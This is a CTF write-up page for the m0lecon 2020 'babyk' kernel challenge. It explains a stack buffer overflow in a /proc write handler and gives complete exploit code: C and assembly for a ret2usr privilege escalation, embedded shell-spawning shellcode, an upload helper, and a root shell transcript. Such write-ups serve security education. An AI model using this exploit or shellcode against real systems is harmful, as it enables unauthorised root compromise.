<!DOCTYPE html>
<html lang="en">

  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>fibonhack | babyk</title>

    <!-- Bootstrap -->
    <link rel="stylesheet" href="/assets/css/bootstrap-3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="/assets/css/main.css">


    <link rel="shortcut icon" href="/assets/images/favicon.jpg">
    <script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-167636907-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'UA-167636907-1');
    </script>

</head>


    <body>
      <div class="container">

        <header class="row">
    <div class="col-lg-8 col-lg-offset-2">
        <img class="main-logo" src="/assets/images/fibonhack.png" alt="fibonhack">
    </div>
</header>

<div class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <div class="menu glow-yellow">
      <ul>
          <li><a href="/" >home</a></li>
          <li><a href="/resources" >resources</a></li>
          <li><a href="/posts" >posts</a></li>
          <li><a href="/writeups" >writeups</a></li>
        </ul>
    </div>
  </div>
</div>



        <div class="row">
          <div class="col-lg-8 col-lg-offset-2">
            <main>
            <div class="post">
  <article class="post-content">
  <div class="post">

  <header class="post-header" style="padding-bottom: 0.8em;">
    <p> 24 May 2020 </p>
    <h1 style="margin: -0.02em auto;"> babyk - m0lecon 2020 Teaser - pwn</h1>
    <div id="authors"> by
    
    
      
      <a href="/members/NicolaVV">NicolaVV</a>
      
    
    
    </div>
  </header>

  <article class="post-content">
  <h2 id="the-challenge">The challenge</h2>
<p>That was an introductory challenge in kernel exploitation, all modern protections were disabled, source code was given, and the vulnerability was an easy to spot buffer overflow in the write handler of the module.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">BUFSIZE</span><span class="p">];</span>

	<span class="c1">// if(*ppos &gt; 0 || count &gt; BUFSIZE)</span>
		<span class="c1">// return -EFAULT;</span>

	<span class="k">if</span><span class="p">(</span><span class="n">raw_copy_from_user</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">ubuf</span><span class="p">,</span> <span class="n">count</span><span class="p">))</span> <span class="c1">// no bounds checking at all</span>
		<span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
</code></pre></div></div>

<p>So the plan to get root privileges is:</p>
<ul>
  <li>take control over saved_rip with the buffer overflow</li>
  <li>make the kernel return to user mapped code, and execute
commit_creds(prepare_kernel_creds(0))</li>
  <li>nicely switch to userspace without crashing the kernel, to spawn a shell and read the flag</li>
</ul>

<h3 id="finding-the-right-number-of-as">Finding the right number of Aâ€™s</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo </span>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac <span class="o">&gt;</span> /proc/babydev
</code></pre></div></div>

<p>Gives a nice kernel panic with <code class="language-plaintext highlighter-rouge">RIP=0x6261616862616167</code> which in ascii translates to <code class="language-plaintext highlighter-rouge">gaabhaab</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$ </span>pwn cyclic <span class="nt">-l</span> gaab
124
</code></pre></div></div>

<h3 id="putting-all-together">Putting all together</h3>

<p><code class="language-plaintext highlighter-rouge">exploit.c</code></p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define MAP_PRIVATE     0x02    </span><span class="cm">/* Changes are private.  */</span><span class="cp">
#define MAP_FIXED       0x10    </span><span class="cm">/* Interpret addr exactly.  */</span><span class="cp">
#define MAP_ANONYMOUS   0x20    </span><span class="cm">/* Don't use a file.  */</span><span class="cp">
#define	O_RDWR		    0x0002  </span><span class="cm">/* open for reading and writing */</span><span class="cp">
</span>
<span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">qword</span><span class="p">;</span>

<span class="k">extern</span> <span class="kt">void</span> <span class="nf">kernel_shellcode</span><span class="p">();</span>
<span class="kt">char</span> <span class="n">user_shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span class="s">"</span><span class="p">;</span>

<span class="n">qword</span> <span class="nf">mcpy</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">dst</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">src</span><span class="p">,</span> <span class="n">qword</span> <span class="n">n</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">qword</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
        <span class="n">dst</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">src</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
	<span class="k">return</span> <span class="n">n</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="o">*</span> <span class="nf">mmap</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span> <span class="n">addr</span><span class="p">,</span> <span class="n">qword</span> <span class="n">size</span><span class="p">,</span> <span class="n">qword</span> <span class="n">prot</span><span class="p">,</span> <span class="n">qword</span> <span class="n">flags</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="n">syscall64</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">prot</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">_start</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> 
<span class="p">{</span>
	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
	<span class="kt">char</span> <span class="o">*</span> <span class="n">payload</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
    <span class="c1">// Prepare memory for ret2usr</span>
	<span class="kt">void</span> <span class="o">*</span><span class="n">userland_stack</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xcafe000</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span><span class="o">|</span><span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="mh">0x0100</span><span class="p">);</span>
	<span class="kt">void</span> <span class="o">*</span><span class="n">userland_code</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x1234000</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span><span class="o">|</span><span class="n">MAP_FIXED</span><span class="o">|</span><span class="n">MAP_PRIVATE</span><span class="p">);</span>
	<span class="n">mcpy</span><span class="p">(</span><span class="n">userland_code</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">user_shellcode</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">user_shellcode</span><span class="p">));</span>
    <span class="c1">// Fill up stack until saved_rip</span>
	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">124</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
		<span class="o">*</span><span class="p">(</span><span class="n">payload</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="sc">'A'</span><span class="p">;</span>
	<span class="o">*</span><span class="p">(</span><span class="n">qword</span> <span class="o">*</span><span class="p">)</span><span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span> <span class="n">kernel_shellcode</span><span class="p">;</span> <span class="n">payload</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">;</span>
	<span class="c1">// Profit</span>
	<span class="kt">int</span> <span class="n">vuln_fd</span> <span class="o">=</span> <span class="n">syscall64</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"/proc/babydev"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">,</span><span class="mi">100</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
	<span class="n">syscall64</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">vuln_fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">payload</span> <span class="o">-</span> <span class="n">buf</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="n">syscall64</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">exploit.S</code></p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">.text</span>
<span class="nf">.intel_syntax</span> <span class="nv">noprefix</span>

<span class="nf">.global</span> <span class="nv">syscall64</span>
<span class="nf">.global</span> <span class="nv">kernel_shellcode</span>

<span class="nl">kernel_shellcode:</span>
    <span class="err">#</span> <span class="nf">commit_cred</span><span class="p">(</span><span class="nv">prepare_kernel_creds</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
    <span class="nf">xor</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rdi</span>
    <span class="nf">mov</span> <span class="nb">rcx</span><span class="p">,</span> <span class="mh">0xffffffff81052a60</span>     <span class="err">#</span> <span class="nv">cat</span> <span class="nv">kallsyms</span> <span class="o">|</span> <span class="nv">grep</span> <span class="nv">prepare_kernel_creds</span>
    <span class="nf">call</span> <span class="nb">rcx</span>
    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rax</span>
    <span class="nf">mov</span> <span class="nb">rcx</span><span class="p">,</span> <span class="mh">0xffffffff81052830</span>     <span class="err">#</span> <span class="nv">cat</span> <span class="nv">kallsyms</span> <span class="o">|</span> <span class="nv">grep</span> <span class="nv">commit_creds</span>
    <span class="nf">call</span> <span class="nb">rcx</span>
<span class="nl">context_switch:</span>
    <span class="nf">swapgs</span>
    <span class="err">#</span> <span class="nf">ss</span>
    <span class="nf">mov</span> <span class="nv">r15</span><span class="p">,</span> <span class="mh">0x2b</span>
    <span class="nf">push</span> <span class="mh">0x2b</span> 
    <span class="err">#</span> <span class="nf">rsp</span> <span class="o">-</span> <span class="nv">mmapped</span> <span class="nv">value</span>
    <span class="nf">mov</span> <span class="nv">r15</span><span class="p">,</span> <span class="mh">0xcafe000</span>
    <span class="nf">push</span> <span class="nv">r15</span>
    <span class="err">#</span> <span class="nf">rflags</span> <span class="o">-</span> <span class="nv">dummy</span> <span class="nv">value</span>
    <span class="nf">mov</span> <span class="nv">r15</span><span class="p">,</span> <span class="mh">0x246</span>
    <span class="nf">push</span> <span class="nv">r15</span>
    <span class="err">#</span> <span class="nf">cs</span>
    <span class="nf">mov</span> <span class="nv">r15</span><span class="p">,</span> <span class="mh">0x33</span>
    <span class="nf">push</span> <span class="nv">r15</span>
    <span class="err">#</span> <span class="nf">rip</span> <span class="o">-</span> <span class="nv">mmapped</span> <span class="nv">value</span>
    <span class="nf">mov</span> <span class="nv">r15</span><span class="p">,</span> <span class="mh">0x1234000</span>
    <span class="nf">push</span> <span class="nv">r15</span>
    <span class="nf">iretq</span>
<span class="nl">end_kernel_shellcode:</span>
    <span class="nf">nop</span>

<span class="nl">syscall64:</span>
    <span class="nf">pop</span> <span class="nv">r14</span>
    <span class="nf">pop</span> <span class="nv">r15</span>
    <span class="nf">push</span> <span class="nv">r15</span>
    <span class="nf">push</span> <span class="nv">r14</span>
    <span class="nf">sub</span> <span class="nb">rsp</span><span class="p">,</span> <span class="mh">0x100</span>

    <span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="nb">rdi</span>
    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rsi</span>
    <span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nb">rdx</span>
    <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rcx</span>
    <span class="nf">mov</span> <span class="nv">r10</span><span class="p">,</span> <span class="nv">r8</span>
    <span class="nf">mov</span> <span class="nv">r8</span><span class="p">,</span><span class="nv">r9</span> 
    <span class="nf">mov</span> <span class="nv">r9</span><span class="p">,</span> <span class="nv">r15</span>
    <span class="nf">syscall</span>

    <span class="nf">add</span> <span class="nb">rsp</span><span class="p">,</span> <span class="mh">0x100</span>
    <span class="nf">ret</span>
</code></pre></div></div>

<p>Compilable with the command: <code class="language-plaintext highlighter-rouge">gcc exploit/exploit.c exploit/exploit.S -no-pie -nostdlib -fomit-frame-pointer</code>.</p>

<p>Since gcc was not available on the remote qemu instance, the exploit needed to
be compiled in local and then sent it to the remote server, this did the trick:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">send_exploit</span><span class="p">(</span><span class="n">compressed_elf</span><span class="p">):</span>
    <span class="n">CHUNK_SZ</span> <span class="o">=</span> <span class="mi">256</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">compressed_elf</span><span class="p">),</span> <span class="n">CHUNK_SZ</span><span class="p">):</span>
        <span class="n">chunk</span> <span class="o">=</span> <span class="n">compressed_elf</span><span class="p">[</span><span class="n">i</span><span class="p">:</span> <span class="nb">min</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="n">CHUNK_SZ</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">compressed_elf</span><span class="p">))]</span>
        <span class="n">chunk</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
        <span class="n">cmd</span> <span class="o">=</span> <span class="s">"echo %s | base64 -d  &gt;&gt; /home/user/exp.gz"</span> <span class="o">%</span> <span class="n">chunk</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"cat /home/user/exp.gz | gzip -d &gt; /home/user/exp"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"chmod +x /home/user/exp"</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="profit">Profit</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/ $ /home/user/exp
/bin/sh: can't access tty; job control turned off

/ # cat /root/flag.txt
ptm{y0ure_w3lc0m3_4_4ll_th15_k3rn3l_m3g4_fun}
</code></pre></div></div>

<h3 id="references">References:</h3>
<ul>
  <li>https://mem2019.github.io/jekyll/update/2019/01/11/Linux-Kernel-Pwn-Basics.html</li>
  <li>https://github.com/pr0cf5/kernel-exploit-practice/tree/master/return-to-user</li>
</ul>

  </article>
</div>

  </article>

</div>

            </main>
          </div>
        </div>

        <div class="row">
    <div class="col-lg-8 col-lg-offset-2">
        <footer>
            <div>
                <div class="footer left column one-half">
                    <small class="glow-yellow">
                        Theme <a href="https://github.com/gildasio/clyell"> clyell</a> by <a
                            href="https://github.com/gildasio/">gildasio</a> <br class="hidden visible-xs">powered by <a
                            href="https://github.com/jekyll/jekyll">{{ jekyll }}</a>
                    </small>
                </div>

                <div class="footer right column one-half">
                    <section class="small-font">
                        <a href="https://twitter.com/fibonhack"><span class="icon icon--twitter">
    <svg viewBox="0 0 16 16">
        <path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/>
    </svg>
</span>
</a>
                        <a href="https://github.com/fibonhack"><span class="icon icon--github">
    <svg viewBox="0 0 16 16">
        <path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/>
    </svg>
</span>
</a>
                    </section>
                </div>
            </div>
        </footer>
    </div>
</div>

      </div>
    </body>
</html>
